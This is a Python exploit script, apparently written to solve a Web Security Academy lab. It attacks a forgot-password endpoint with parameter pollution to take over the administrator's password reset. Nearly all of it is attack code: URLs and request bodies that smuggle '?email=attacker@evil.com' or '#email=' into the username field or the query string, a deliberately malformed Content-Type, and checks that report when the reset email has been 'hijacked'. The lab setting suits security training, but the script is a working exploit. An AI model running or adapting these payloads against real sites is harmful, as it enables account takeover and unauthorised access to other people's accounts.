#!/usr/bin/env python3
import requests
import sys
import json
import re

def get_csrf_token(session, lab_url):
    """Get CSRF token from forgot-password page"""
    resp = session.get(f"{lab_url}/forgot-password")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)
    if csrf_match:
        return csrf_match.group(1)
    return None

def exploit_url_query(lab_url):
    """Try adding query parameters to the URL itself"""

    session = requests.Session()
    session.get(f"{lab_url}/login")

    csrf = get_csrf_token(session, lab_url)
    print(f"Session: {session.cookies.get('session')}")
    print(f"CSRF: {csrf}")

    # Malformed Content-Type
    headers = {
        "Content-Type": "x-www-form-urlencoded",  # MALFORMED!
        "Accept": "*/*",
        "Origin": lab_url,
        "Referer": f"{lab_url}/forgot-password"
    }

    print("\n[*] Testing URL query parameter injection...")

    # Try adding query parameters to the URL itself
    test_urls = [
        # Add email parameter to URL
        f"{lab_url}/forgot-password?email=attacker@evil.com",
        f"{lab_url}/forgot-password?result=attacker@evil.com",
        f"{lab_url}/forgot-password?to=attacker@evil.com",
        f"{lab_url}/forgot-password?recipient=attacker@evil.com",

        # Try multiple parameters
        f"{lab_url}/forgot-password?username=administrator&email=attacker@evil.com",
        f"{lab_url}/forgot-password?email=attacker@evil.com&username=administrator",

        # Override attempt
        f"{lab_url}/forgot-password?field=email&value=attacker@evil.com",
    ]

    body_data = f"csrf={csrf}&username=administrator"

    for i, url in enumerate(test_urls, 1):
        print(f"\n[Test {i}]")
        print(f"URL: {url}")
        print(f"Body: {body_data}")

        try:
            response = session.post(
                url,
                data=body_data,
                headers=headers,
                allow_redirects=False
            )

            print(f"Status: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    print(f"Response: {result}")

                    if "result" in result:
                        email = result["result"]
                        if "attacker" in email or "evil" in email:
                            print(f"\n[!!!] SUCCESS! Email hijacked to: {email}")
                            print(f"[!!!] Working URL: {url}")
                            return True
                        elif "*****" not in email and "@" in email:
                            print(f"[!] Email revealed/changed: {email}")

                except json.JSONDecodeError:
                    print(f"Non-JSON: {response.text[:100]}")

        except Exception as e:
            print(f"Error: {e}")

    # Now try with the body parameter injection but different encoding
    print("\n[*] Testing combined URL and body parameter pollution...")

    reset_url = f"{lab_url}/forgot-password"

    # Try different ways of injecting parameters
    combined_tests = [
        # Try to inject query string in username
        (reset_url, f"csrf={csrf}&username=administrator%3Femail%3Dattacker%40evil.com"),
        (reset_url, f"csrf={csrf}&username=administrator%3Femail=attacker@evil.com"),

        # Try fragment injection
        (reset_url, f"csrf={csrf}&username=administrator%23email%3Dattacker@evil.com"),

        # Try with query in URL and body
        (f"{reset_url}?email=attacker@evil.com", f"csrf={csrf}&username=administrator"),
        (f"{reset_url}?result=attacker@evil.com", f"csrf={csrf}&username=administrator"),
    ]

    for i, (url, body) in enumerate(combined_tests, 1):
        print(f"\n[Combined Test {i}]")
        print(f"URL: {url}")
        print(f"Body: {body[:80]}...")

        try:
            response = session.post(
                url,
                data=body,
                headers=headers,
                allow_redirects=False
            )

            print(f"Status: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    print(f"Response: {result}")

                    if "result" in result:
                        email = result["result"]
                        if "attacker" in email or "evil" in email:
                            print(f"\n[!!!] SUCCESS! Email hijacked to: {email}")
                            return True

                except json.JSONDecodeError:
                    print(f"Non-JSON: {response.text[:100]}")

        except Exception as e:
            print(f"Error: {e}")

    return False

if __name__ == "__main__":
    lab_url = "https://0aa1009a0379161a82cd10b40031005f.web-security-academy.net"

    if len(sys.argv) > 1:
        lab_url = sys.argv[1].rstrip('/')

    print(f"Exploiting URL query parameters at: {lab_url}")
    exploit_url_query(lab_url)